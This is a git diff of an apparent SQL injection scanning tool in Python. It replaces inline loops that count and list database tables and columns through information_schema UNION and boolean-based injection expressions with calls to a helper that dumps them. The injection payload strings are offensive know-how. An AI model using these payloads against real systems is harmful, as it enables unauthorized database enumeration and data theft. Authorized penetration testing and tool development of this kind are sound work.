@@ -102,50 +102,14 @@ class Scanner:
     
 					union_expression = f"database(),{nulls}"
   
-					db_name = self.extract.find_expressions_name(
+					db_name = self.extract.find_db_elem_name(
 						url, param, context, column_count, "database()", union_expression,
 					)
 					if db_name:
 						Logger.success(f"Found database name: {YELLOW}{db_name}{RESET}!\n")
 
-					# Get the number of tables on the database
-					table_count_expression = f"(SELECT COUNT(*) FROM information_schema.tables)"
-					table_count = self.boolean.get_number_returned_by_sql(
-						url, param, context, table_count_expression, HEIGH_ELEMENT_COUNT
-					)
-					Logger.success(f"Found table count: {YELLOW}{table_count}{RESET}")
-     
-					for table in range(table_count):
-						expression = f"(SELECT table_name FROM information_schema.tables LIMIT {table},1)"
-						# Limit is one further as it prints the first SELECT results at index 0
-						union_expression = f"SELECT table_name,{nulls} FROM information_schema.tables LIMIT {table + 1},1"
-
-						table_name = self.extract.find_expressions_name(
-							url, param, context, column_count,
-							expression, union_expression
-						)
-						if table_name:
-							Logger.success(f"Found table name: {YELLOW}{table_name}{RESET}\n")
-       
-
-					# Get the number of tables on the database
-					# column_count_expression = f"(SELECT COUNT(*) FROM information_schema.columns)"
-					# column_count = self.boolean.get_number_returned_by_sql(
-					# 	url, param, context, column_count_expression, HEIGH_ELEMENT_COUNT
-					# )
-					# Logger.success(f"Found column count: {YELLOW}{column_count}{RESET}")
-     
-					# for column in range(column_count):
-					# 	expression = f"(SELECT column_name FROM information_schema.columns LIMIT {column},1)"
-					# 	# Limit is one further as it prints the first SELECT results at index 0
-					# 	union_expression = f"SELECT column_name,{nulls} FROM information_schema.columns LIMIT {column + 1},1"
-
-					# 	column_name = self.extract.find_expressions_name(
-					# 		url, param, context, column_count,
-					# 		expression, union_expression
-					# 	)
-					# 	if column_name:
-					# 		Logger.success(f"Found column name: {YELLOW}{column_name}{RESET}\n")       
+					self.extract.dump_db_elem_entries(url, param, context, column_count, nulls, "table")
+					self.extract.dump_db_elem_entries(url, param, context, column_count, nulls, "column")
 
 			else:
 				Logger.failure(f"Boolean based injection unsuccessful")
